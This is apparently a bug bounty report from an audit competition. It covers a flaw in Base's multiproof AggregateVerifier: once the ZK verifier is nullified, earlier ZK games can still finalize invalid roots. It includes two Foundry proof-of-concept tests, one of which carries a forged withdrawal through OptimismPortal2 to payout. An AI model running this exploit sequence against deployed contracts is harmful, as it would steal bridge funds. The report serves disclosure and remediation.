# 75502 sc low nullified zk verifier does not invalidate prior zk games allowing invalid roots to finalize after a soundness alert

**Submitted on Apr 29th 2026 at 14:15:29 UTC by @Brainiac5 for** [**Audit Comp | Base Azul**](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #75502
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/base/contracts/tree/v8.1.0/src/multiproof>
* **Impacts:**
  * Forging or bypassing TEE or ZK proof verification in AggregateVerifier to finalize an invalid state root on L1
  * Draining or stealing funds from the L1 bridge portal through invalid withdrawal proofs constructed against a forged finalized state
  * Circumventing the dispute/challenge mechanism to prevent correction of an invalid proposal before finalization
  * Bypassing the soundness alert mechanism — two conflicting valid proofs of the same type (both TEE or both ZK) fail to trigger automatic game nullification

## Description

## Brief/Intro

When a same-type soundness alert happens, `AggregateVerifier.nullify()` deletes the proof only in the game that made the alert and sets the global verifier's `nullified` flag. However, other in-progress games that already accepted proofs from the now-nullified verifier keep their `proofCount` and can still resolve `DEFENDER_WINS`. For a ZK-only game, this is worse because the normal correction path also becomes unusable: `nullify()` requires another ZK proof, but `ZK_VERIFIER.verify()` now reverts because the verifier is already nullified.

In plain terms: the system has an alarm that says "this ZK verifier is broken", but old games that already used the broken verifier can still cash out as valid. After the alarm is raised, users also cannot use the same ZK verifier to correct those old games anymore.

## Vulnerability Details

`Verifier.nullify()` records that a verifier is no longer trusted:

```solidity
function nullify() external override {
    if (
        !ANCHOR_STATE_REGISTRY.isGameProper(IDisputeGame(msg.sender))
            || !ANCHOR_STATE_REGISTRY.isGameRespected(IDisputeGame(msg.sender))
    ) revert NotProperGame();
    nullified = true;

    emit VerifierNullified(IDisputeGame(msg.sender));
}
```

The proof verifier then rejects future proof verification:

```solidity
modifier notNullified() {
    if (nullified) revert Nullified();
    _;
}
```

`AggregateVerifier.nullify()` correctly removes the targeted proof from the current game and calls the verifier's global `nullify()` hook:

```solidity
_proofRefutedUpdate(proofType);

emit Nullified(msg.sender, intermediateRootIndex, intermediateRootToProve);

if (proofType == ProofType.ZK) {
    delete counteredByIntermediateRootIndexPlusOne;

    IVerifier(ZK_VERIFIER).nullify();
} else if (proofType == ProofType.TEE) {
    IVerifier(TEE_VERIFIER).nullify();
}
```

But `AggregateVerifier.resolve()` only checks `proofCount` and `gameOver()`. It does not check whether the stored proof type came from a verifier that has since been nullified:

```solidity
if (!gameOver()) revert GameNotOver();
if (proofCount < PROOF_THRESHOLD) revert NotEnoughProofs();

if (counteredByIntermediateRootIndexPlusOne > 0) {
    status = GameStatus.CHALLENGER_WINS;
    bondRecipient = proofTypeToProver[ProofType.ZK];
} else {
    status = GameStatus.DEFENDER_WINS;
}
```

This means a prior ZK-only game can still resolve even after another game has proven the ZK verifier unsound and set `ZK_VERIFIER.nullified == true`.

The correction path is also blocked after the global alert. For a ZK-only game, `nullify()` requires a ZK proof because `proofTypeToProver[ProofType.ZK]` is the populated slot. But `_verifyZkProof()` calls `ZK_VERIFIER.verify()`, and the verifier now reverts with `Verifier.Nullified`.

So the state becomes:

1. Game A has an already accepted ZK proof.
2. Game B proves the ZK verifier is unsound and calls `ZK_VERIFIER.nullify()`.
3. Game A still has `proofCount == 1`.
4. Game A cannot be corrected via same-type ZK nullification anymore.
5. Game A can still resolve `DEFENDER_WINS`.
6. The root from Game A can become claim-valid in `AnchorStateRegistry`.

## Impact Details

The direct impact is that the soundness alert does not fail closed for existing games. It only blocks future proof verification and removes the proof from the alerting game.

If any already-created ZK-only game contains an invalid root from the now-nullified verifier, that game can still finalize as `DEFENDER_WINS` after the slow finalization delay. Because the verifier is already nullified, normal same-type nullification cannot be used to correct it. Once the game resolves, `AnchorStateRegistry.isGameClaimValid()` treats that stale root as valid and `OptimismPortal2` can finalize withdrawals proven against it.

This is not a trusted-admin issue. No privileged action is needed to create the stale game, trigger verifier nullification, resolve the stale game, or finalize the withdrawal. A manual blacklist can act as an emergency backstop, but the automatic soundness-alert path itself fails open: after the protocol has cryptographic evidence that a verifier is unsound, `resolve()` still counts old proofs from that verifier.

This is also not the same as saying "assume a forged proof exists, so anything is possible." The report starts from the soundness-alert condition already handled by the protocol: two conflicting same-type proofs exist and one game successfully nullifies the verifier. The bug is what happens after that alert: other games using the same verifier remain live and become harder to correct.

## Suggested Fix

Track proof validity against verifier state at resolution time.

Possible fixes:

* In `resolve()`, reject unresolved games that have a populated ZK proof if `ZK_VERIFIER.nullified()` is true, and reject games with a populated TEE proof if `TEE_VERIFIER.nullified()` is true.
* Add a verifier epoch or generation number. Store the verifier epoch when a proof is accepted and invalidate unresolved games when the verifier epoch is nullified.
* When a verifier is nullified, make `AnchorStateRegistry.isGameClaimValid()` reject unresolved or resolved games that depend on that verifier unless they were explicitly revalidated under a later verifier epoch.
* Add tests where one game nullifies a verifier and another unresolved game with the same proof type attempts to resolve.

## References

* Base Azul Immunefi scope page: `https://immunefi.com/audit-competition/audit-comp-base-azul/scope/`
* `contracts/src/multiproof/AggregateVerifier.sol:443`
* `contracts/src/multiproof/AggregateVerifier.sol:458`
* `contracts/src/multiproof/AggregateVerifier.sol:465`
* `contracts/src/multiproof/AggregateVerifier.sol:548`
* `contracts/src/multiproof/AggregateVerifier.sol:589`
* `contracts/src/multiproof/AggregateVerifier.sol:598`
* `contracts/src/multiproof/AggregateVerifier.sol:763`
* `contracts/src/multiproof/AggregateVerifier.sol:788`
* `contracts/src/multiproof/Verifier.sol:14`
* `contracts/src/multiproof/Verifier.sol:27`
* `contracts/src/multiproof/Verifier.sol:39`
* `contracts/test/multiproof/AuditNullifiedVerifierStaleWithdrawalEndToEnd.t.sol:79`
* `contracts/test/multiproof/AuditNullifiedVerifierFinalizes.t.sol:12`

## Confidence

Confirmed locally with two runnable Foundry PoCs.

The end-to-end PoC proves that after a same-type ZK soundness alert nullifies the verifier, a separate prior ZK-only game using that verifier can no longer be same-type nullified, still resolves `DEFENDER_WINS`, becomes claim-valid, and is accepted by `OptimismPortal2` to finalize a withdrawal.

## Proof of Concept

## Primary End-to-End Proof of Concept

This PoC demonstrates the full end impact through the actual `OptimismPortal2` withdrawal path:

1. Game A accepts a ZK proof for an attacker-controlled withdrawal output root while the ZK verifier is trusted.
2. Game B triggers the same-type ZK soundness alert and globally nullifies the ZK verifier.
3. Game A can no longer be corrected with another ZK proof because `ZK_VERIFIER.verify()` now reverts with `Verifier.Nullified`.
4. Game A still resolves `DEFENDER_WINS` because `AggregateVerifier.resolve()` only checks `proofCount`, not current verifier validity.
5. `AnchorStateRegistry.isGameClaimValid(Game A)` returns true.
6. `OptimismPortal2.proveWithdrawalTransaction()` and `finalizeWithdrawalTransaction()` pay the withdrawal from the stale root.

PoC file:

```
contracts/test/multiproof/AuditNullifiedVerifierStaleWithdrawalEndToEnd.t.sol
```

Run:

```sh
cd base-azul/contracts
forge test --match-path test/multiproof/AuditNullifiedVerifierStaleWithdrawalEndToEnd.t.sol -vvv
```

Observed result:

```
Ran 1 test for test/multiproof/AuditNullifiedVerifierStaleWithdrawalEndToEnd.t.sol:AuditNullifiedVerifierStaleWithdrawalEndToEndTest
[PASS] testStaleZkGamePaysWithdrawalAfterVerifierIsNullified()
Suite result: ok. 1 passed; 0 failed; 0 skipped
```

Important implementation notes from the PoC:

* The helper verifier is strict: it only accepts the exact journal that `AggregateVerifier` computes.
* The nullification proof uses the segment-level journal used by `nullify()`, not the full proposal-range journal.
* The nullification proof is submitted by the prover address bound into the journal, matching the `msg.sender` binding in `_verifyZkProof()`.
* The portal proof uses the real `ffi.getProveWithdrawalTransactionInputs()` helper and the real `OptimismPortal2` prove/finalize functions.

Full PoC code:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import { OptimismPortal2_TestInit } from "test/L1/OptimismPortal2.t.sol";

import { IAnchorStateRegistry } from "interfaces/dispute/IAnchorStateRegistry.sol";
import { IDelayedWETH } from "interfaces/dispute/IDelayedWETH.sol";
import { IDisputeGame } from "interfaces/dispute/IDisputeGame.sol";
import { IVerifier } from "interfaces/multiproof/IVerifier.sol";

import { Types } from "src/libraries/Types.sol";
import { Hashing } from "src/libraries/Hashing.sol";
import { AggregateVerifier } from "src/multiproof/AggregateVerifier.sol";
import { MockVerifier } from "src/multiproof/mocks/MockVerifier.sol";
import { Verifier } from "src/multiproof/Verifier.sol";
import { Claim, GameStatus, GameType, Hash } from "src/dispute/lib/Types.sol";

contract NullifiedVerifierStrictJournalVerifier is Verifier {
    bytes32 public expectedJournal;

    constructor(IAnchorStateRegistry anchorStateRegistry) Verifier(anchorStateRegistry) { }

    function setExpectedJournal(bytes32 journal) external {
        expectedJournal = journal;
    }

    function verify(bytes calldata, bytes32, bytes32 journal) external view override notNullified returns (bool) {
        return journal == expectedJournal;
    }
}

contract AuditNullifiedVerifierStaleWithdrawalEndToEndTest is OptimismPortal2_TestInit {
    GameType internal constant AGGREGATE_VERIFIER_GAME_TYPE = GameType.wrap(621);
    uint256 internal constant L2_CHAIN_ID = 8453;
    uint256 internal constant BLOCK_INTERVAL = 100;
    uint256 internal constant INTERMEDIATE_BLOCK_INTERVAL = 10;
    uint256 internal constant PROOF_THRESHOLD = 1;

    address internal constant ZK_PROVER = address(0xA11CE);
    address internal constant ATTACKER_CONTRACT = 0x4242424242424242424242424242424242424242;
    address internal constant WITHDRAWAL_TARGET = 0x2222222222222222222222222222222222222222;

    bytes32 internal constant TEE_IMAGE_HASH = keccak256("tee-image");
    bytes32 internal constant ZK_RANGE_HASH = keccak256("zk-range");
    bytes32 internal constant ZK_AGGREGATE_HASH = keccak256("zk-aggregate");
    bytes32 internal constant CONFIG_HASH = keccak256("config");

    NullifiedVerifierStrictJournalVerifier internal strictZkVerifier;

    function setUp() public override {
        super.setUp();

        MockVerifier teeVerifier = new MockVerifier(IAnchorStateRegistry(address(anchorStateRegistry)));
        strictZkVerifier =
            new NullifiedVerifierStrictJournalVerifier(IAnchorStateRegistry(address(anchorStateRegistry)));

        AggregateVerifier aggregateVerifierImpl = new AggregateVerifier(
            AGGREGATE_VERIFIER_GAME_TYPE,
            IAnchorStateRegistry(address(anchorStateRegistry)),
            IDelayedWETH(payable(address(delayedWeth))),
            IVerifier(address(teeVerifier)),
            IVerifier(address(strictZkVerifier)),
            TEE_IMAGE_HASH,
            AggregateVerifier.ZkHashes(ZK_RANGE_HASH, ZK_AGGREGATE_HASH),
            CONFIG_HASH,
            L2_CHAIN_ID,
            BLOCK_INTERVAL,
            INTERMEDIATE_BLOCK_INTERVAL,
            PROOF_THRESHOLD
        );

        disputeGameFactory.setImplementation(AGGREGATE_VERIFIER_GAME_TYPE, IDisputeGame(address(aggregateVerifierImpl)));
        disputeGameFactory.setInitBond(AGGREGATE_VERIFIER_GAME_TYPE, 0);

        vm.prank(optimismPortal2.guardian());
        anchorStateRegistry.setRespectedGameType(AGGREGATE_VERIFIER_GAME_TYPE);
    }

    function testStaleZkGamePaysWithdrawalAfterVerifierIsNullified() public {
        Types.WithdrawalTransaction memory forgedWithdrawal = Types.WithdrawalTransaction({
            nonce: uint256(1) << 240,
            sender: ATTACKER_CONTRACT,
            target: WITHDRAWAL_TARGET,
            value: 1 ether,
            gasLimit: 100_000,
            data: hex""
        });

        (
            bytes32 stateRoot,
            bytes32 storageRoot,
            bytes32 outputRoot,
            bytes32 withdrawalHash,
            bytes[] memory withdrawalProof
        ) = ffi.getProveWithdrawalTransactionInputs(forgedWithdrawal);

        Types.OutputRootProof memory outputRootProof = Types.OutputRootProof({
            version: bytes32(0),
            stateRoot: stateRoot,
            messagePasserStorageRoot: storageRoot,
            latestBlockhash: bytes32(0)
        });

        assertEq(outputRoot, Hashing.hashOutputRootProof(outputRootProof));
        assertEq(withdrawalHash, Hashing.hashWithdrawal(forgedWithdrawal));

        // Game A accepts the attacker's withdrawal output root while the ZK verifier is still trusted.
        // This models the exact pre-alert window the protocol must fail closed for.
        (AggregateVerifier survivingGame, uint256 survivingGameIndex) = _createAcceptedZkGame(outputRoot);
        assertEq(survivingGame.proofCount(), 1);
        assertFalse(strictZkVerifier.nullified());

        // Game B presents a conflicting same-type ZK proof. This is the protocol's built-in
        // soundness-alert path: the alerting game loses its proof and the global verifier is nullified.
        AggregateVerifier alertGame = _createAcceptedZkGameWithClaim(keccak256("alert-root-a"));
        _nullifyZkVerifierWithConflictingProof(alertGame, keccak256("alert-root-b"));

        assertTrue(strictZkVerifier.nullified());
        assertEq(alertGame.proofCount(), 0);

        // After the alert, Game A cannot be corrected with another ZK proof because the global
        // verifier now rejects every future verification before AggregateVerifier can compare roots.
        _expectSurvivingGameZkNullificationToBeBlocked(survivingGame);

        // The stale proof that was accepted before the alert still counts at resolution time.
        // This is the core bug: resolve() never checks whether its stored proof came from a
        // verifier that has since been globally nullified.
        vm.warp(block.timestamp + survivingGame.SLOW_FINALIZATION_DELAY() + 1);
        survivingGame.resolve();
        assertEq(uint8(survivingGame.status()), uint8(GameStatus.DEFENDER_WINS));

        vm.warp(block.timestamp + anchorStateRegistry.disputeGameFinalityDelaySeconds() + 1);
        assertTrue(anchorStateRegistry.isGameClaimValid(IDisputeGame(address(survivingGame))));

        // End impact: the portal accepts the stale game's output root and pays the withdrawal.
        optimismPortal2.proveWithdrawalTransaction(
            forgedWithdrawal, survivingGameIndex, outputRootProof, withdrawalProof
        );

        vm.warp(block.timestamp + optimismPortal2.proofMaturityDelaySeconds() + 1);
        vm.deal(address(optimismPortal2), forgedWithdrawal.value);

        uint256 targetBalanceBefore = WITHDRAWAL_TARGET.balance;
        optimismPortal2.finalizeWithdrawalTransaction(forgedWithdrawal);

        assertTrue(optimismPortal2.finalizedWithdrawals(withdrawalHash));
        assertEq(WITHDRAWAL_TARGET.balance, targetBalanceBefore + forgedWithdrawal.value);
    }

    function _createAcceptedZkGame(bytes32 outputRoot) internal returns (AggregateVerifier game, uint256 gameIndex) {
        game = _createAcceptedZkGameWithClaim(outputRoot);
        gameIndex = disputeGameFactory.gameCount() - 1;
    }

    function _createAcceptedZkGameWithClaim(bytes32 rootClaim) internal returns (AggregateVerifier game) {
        (Hash startingRoot, uint256 startingBlockNumber) = anchorStateRegistry.getAnchorRoot();
        uint256 l2BlockNumber = startingBlockNumber + BLOCK_INTERVAL;
        bytes memory intermediateRoots =
            abi.encodePacked(_generateIntermediateRootsExceptLast(l2BlockNumber), rootClaim);
        bytes memory extraData =
            abi.encodePacked(uint256(l2BlockNumber), address(anchorStateRegistry), intermediateRoots);

        bytes32 l1OriginHash = blockhash(block.number - 1);
        uint256 l1OriginNumber = block.number - 1;

        strictZkVerifier.setExpectedJournal(
            _expectedZkJournal(
                startingRoot, startingBlockNumber, rootClaim, l2BlockNumber, intermediateRoots, l1OriginHash
            )
        );

        bytes memory proof = abi.encodePacked(
            uint8(AggregateVerifier.ProofType.ZK), l1OriginHash, l1OriginNumber, bytes("accepted zk proof")
        );

        vm.prank(ZK_PROVER);
        game = AggregateVerifier(
            address(
                disputeGameFactory.createWithInitData(
                    AGGREGATE_VERIFIER_GAME_TYPE, Claim.wrap(rootClaim), extraData, proof
                )
            )
        );
    }

    function _nullifyZkVerifierWithConflictingProof(AggregateVerifier game, bytes32 conflictingRoot) internal {
        uint256 l2BlockNumber = game.l2SequenceNumber();
        uint256 intermediateRootIndex = BLOCK_INTERVAL / INTERMEDIATE_BLOCK_INTERVAL - 1;
        // nullify() verifies against the fixed game l1Head() CWIA value, not a fresh
        // proof-supplied L1 origin. The PoC binds the expected journal to that exact value.
        bytes32 l1OriginHash = game.l1Head().raw();
        uint256 l1OriginNumber = block.number - 1;
        bytes32 startingRoot = game.intermediateOutputRoot(intermediateRootIndex - 1);
        uint256 startingBlockNumber = game.startingBlockNumber() + intermediateRootIndex * INTERMEDIATE_BLOCK_INTERVAL;

        strictZkVerifier.setExpectedJournal(
            _expectedZkJournal(
                Hash.wrap(startingRoot),
                startingBlockNumber,
                conflictingRoot,
                l2BlockNumber,
                abi.encodePacked(conflictingRoot),
                l1OriginHash
            )
        );

        bytes memory proof = abi.encodePacked(
            uint8(AggregateVerifier.ProofType.ZK), l1OriginHash, l1OriginNumber, bytes("conflicting zk proof")
        );

        vm.prank(ZK_PROVER);
        game.nullify(proof, intermediateRootIndex, conflictingRoot);
    }

    function _expectSurvivingGameZkNullificationToBeBlocked(AggregateVerifier game) internal {
        uint256 l2BlockNumber = game.l2SequenceNumber();
        bytes32 counterRoot = keccak256("counter-root-after-alert");
        bytes32 l1OriginHash = blockhash(block.number - 1);
        uint256 l1OriginNumber = block.number - 1;
        bytes memory proof = abi.encodePacked(
            uint8(AggregateVerifier.ProofType.ZK), l1OriginHash, l1OriginNumber, bytes("counter proof")
        );

        vm.expectRevert(Verifier.Nullified.selector);
        game.nullify(proof, BLOCK_INTERVAL / INTERMEDIATE_BLOCK_INTERVAL - 1, counterRoot);

        assertEq(game.l2SequenceNumber(), l2BlockNumber);
    }

    function _expectedZkJournal(
        Hash startingRoot,
        uint256 startingBlockNumber,
        bytes32 outputRoot,
        uint256 l2BlockNumber,
        bytes memory intermediateRoots,
        bytes32 l1OriginHash
    )
        internal
        pure
        returns (bytes32)
    {
        return keccak256(
            abi.encodePacked(
                ZK_PROVER,
                l1OriginHash,
                startingRoot.raw(),
                uint64(startingBlockNumber),
                outputRoot,
                uint64(l2BlockNumber),
                intermediateRoots,
                CONFIG_HASH,
                ZK_RANGE_HASH
            )
        );
    }

    function _generateIntermediateRootsExceptLast(uint256 l2BlockNumber) internal pure returns (bytes memory) {
        bytes memory intermediateRoots;
        uint256 startingL2BlockNumber = l2BlockNumber - BLOCK_INTERVAL;
        for (uint256 i = 1; i < BLOCK_INTERVAL / INTERMEDIATE_BLOCK_INTERVAL; i++) {
            intermediateRoots = abi.encodePacked(
                intermediateRoots, keccak256(abi.encode(startingL2BlockNumber + INTERMEDIATE_BLOCK_INTERVAL * i))
            );
        }
        return intermediateRoots;
    }
}
```

## Secondary Minimal Proof of Concept

PoC file:

```
contracts/test/multiproof/AuditNullifiedVerifierFinalizes.t.sol
```

Run:

```sh
cd /Users/shealtielanz/bounty/base-azul/contracts
forge test --match-path test/multiproof/AuditNullifiedVerifierFinalizes.t.sol -vvv
```

Observed result:

```
Ran 1 test for test/multiproof/AuditNullifiedVerifierFinalizes.t.sol:AuditNullifiedVerifierFinalizesTest
[PASS] testPreviouslyAcceptedZkProofFinalizesAfterZkVerifierIsNullified()
Suite result: ok. 1 passed; 0 failed; 0 skipped
```

Full PoC code:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import { Claim, GameStatus } from "src/dispute/lib/Types.sol";
import { IDisputeGame } from "interfaces/dispute/IDisputeGame.sol";
import { AggregateVerifier } from "src/multiproof/AggregateVerifier.sol";
import { Verifier } from "src/multiproof/Verifier.sol";

import { BaseTest } from "./BaseTest.t.sol";

contract AuditNullifiedVerifierFinalizesTest is BaseTest {
    function testPreviouslyAcceptedZkProofFinalizesAfterZkVerifierIsNullified() public {
        currentL2BlockNumber += BLOCK_INTERVAL;

        Claim survivingRoot = Claim.wrap(keccak256(abi.encode(currentL2BlockNumber, "survives-alert")));
        bytes memory survivingProof = _generateProof("surviving-zk-proof", AggregateVerifier.ProofType.ZK);

        AggregateVerifier survivingGame = _createAggregateVerifierGame(
            ZK_PROVER, survivingRoot, currentL2BlockNumber, address(anchorStateRegistry), survivingProof
        );

        assertEq(survivingGame.proofCount(), 1);
        assertEq(address(survivingGame.zkProver()), ZK_PROVER);
        assertFalse(zkVerifier.nullified());

        Claim alertRootA = Claim.wrap(keccak256(abi.encode(currentL2BlockNumber, "alert-a")));
        Claim alertRootB = Claim.wrap(keccak256(abi.encode(currentL2BlockNumber, "alert-b")));
        bytes memory alertProofA = _generateProof("alert-zk-proof-a", AggregateVerifier.ProofType.ZK);
        bytes memory alertProofB = _generateProof("alert-zk-proof-b", AggregateVerifier.ProofType.ZK);

        AggregateVerifier alertGame = _createAggregateVerifierGame(
            ZK_PROVER, alertRootA, currentL2BlockNumber, address(anchorStateRegistry), alertProofA
        );

        alertGame.nullify(alertProofB, BLOCK_INTERVAL / INTERMEDIATE_BLOCK_INTERVAL - 1, alertRootB.raw());

        assertTrue(zkVerifier.nullified());
        assertEq(alertGame.proofCount(), 0);

        Claim counterRoot = Claim.wrap(keccak256(abi.encode(uint256(survivingGame.l2SequenceNumber()), "counter")));
        bytes memory counterProof = _generateProof("counter-zk-proof", AggregateVerifier.ProofType.ZK);

        vm.expectRevert(Verifier.Nullified.selector);
        survivingGame.nullify(counterProof, BLOCK_INTERVAL / INTERMEDIATE_BLOCK_INTERVAL - 1, counterRoot.raw());

        vm.warp(block.timestamp + 7 days);
        survivingGame.resolve();

        assertEq(uint8(survivingGame.status()), uint8(GameStatus.DEFENDER_WINS));

        vm.warp(block.timestamp + 1);
        survivingGame.closeGame();

        assertTrue(anchorStateRegistry.isGameClaimValid(IDisputeGame(address(survivingGame))));
    }
}
```

## Expected vs Actual

Expected:

Once a verifier has been nullified due to a same-type soundness alert, unresolved games that rely on existing proofs from that verifier should not be able to finalize as valid. They should either be automatically invalid, rejected by `resolve()`, or tied to a verifier epoch that becomes invalid when the verifier is nullified.

Actual:

`Verifier.nullify()` only blocks future `verify()` calls. `AggregateVerifier.resolve()` still counts previously accepted proofs from the nullified verifier and allows the game to resolve `DEFENDER_WINS`. For ZK-only games, the same-type nullification path is then blocked because the ZK verifier is already nullified.

## Preconditions and Constraints

* A same-type soundness alert occurs for the ZK verifier. The primary PoC models this with a strict local verifier that only accepts the exact journals computed by `AggregateVerifier`.
* At least one other unresolved ZK game already accepted a proof before the verifier was nullified.

A manual blacklist would be an emergency intervention. The issue is that the automatic verifier-nullification path does not invalidate already accepted proofs, so stale games can remain claim-valid unless manually handled.
